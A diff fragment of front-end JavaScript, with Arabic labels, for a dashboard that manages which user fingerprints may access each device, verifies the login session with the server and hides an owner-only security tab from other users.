+                    <button onclick="toggleDeviceAccess('${device.id}', '${userFp}', ${isAllowed})"
+                        style="background:${isAllowed ? '#00cc66' : '#333'};color:#fff;border:none;padding:6px 12px;border-radius:15px;cursor:pointer;font-size:11px;margin:3px;">
+                        ${isAllowed ? '✅' : '⬜'} ${shortFp}...
+                    </button>
+                `;
+            }).join('');
+
+            card.innerHTML = `
+                <div style="color:#9b59b6;font-weight:bold;margin-bottom:8px;">
+                    📱 ${device.name || device.id}
+                </div>
+                <div style="color:#888;font-size:11px;margin-bottom:8px;">
+                    ${device.id}
+                </div>
+                <div style="color:#ccc;font-size:12px;margin-bottom:5px;">المستخدمون المسموح لهم:</div>
+                <div style="display:flex;flex-wrap:wrap;gap:5px;">
+                    ${userChips || '<span style="color:#666;font-size:11px;">لا يوجد مستخدمون مصرح لهم</span>'}
+                </div>
+            `;
+            div.appendChild(card);
+        });
+
+    } catch (e) {
+        console.error('loadDevicePermissions error:', e);
+    }
+}
+
+async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
+    const token = getAuthToken();
+    const endpoint = currentlyAllowed ? '/auth/revoke-device' : '/auth/grant-device';
+
+    try {
+        const res = await fetch(endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token, deviceId, fp })
+        });
+        const data = await res.json();
+        if (data.success) {
+            showNotification('✅ تم', currentlyAllowed ? 'تم سحب الصلاحية' : 'تم منح الصلاحية', '🔐');
+            loadDevicePermissions();
+        } else {
+            alert('❌ فشل: ' + (data.error || ''));
+        }
+    } catch (e) { alert('❌ فشل: ' + e.message); }
+}
+
+// ✅ التحقق من الجلسة عند فتح الصفحة
+(async function verifySession() {
+    const token = getAuthToken();
+    if (!token) {
+        window.location.href = 'login.html';
+        return;
+    }
+    try {
+        const res = await fetch('/auth/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token })
+        });
+        const data = await res.json();
+        if (!data.valid) {
+            sessionStorage.removeItem('logged_in');
+            sessionStorage.removeItem('auth_token');
+            sessionStorage.removeItem('is_owner');
+            window.location.href = 'login.html';
+        } else {
+            sessionStorage.setItem('is_owner', data.isOwner ? 'true' : 'false');
+        }
+    } catch (e) {
+        window.location.href = 'login.html';
+    }
+})();
+
+// 🚫 إخفاء تبويب الأجهزة عن غير المالك
+(function hideSecurityTabForNonOwner() {
+    if (!isOwner()) {
+        const secTab = document.querySelector('.tab[onclick="switchTab(\'security\')"]');
+        if (secTab) secTab.style.display = 'none';
+
+        const secPane = document.getElementById('securityTab');
+        if (secPane) secPane.style.display = 'none';
+
+        window.loadAuthorizedDevices = function() {};
+        window.loadDevicePermissions = function() {};
+    }
+})();
+
+// ✅ استدعاء دوري
+setInterval(() => { loadAuthorizedDevices(); }, 15000);
+loadAuthorizedDevices();
 
 loadDevices();
 setInterval(loadDevices, 10000);
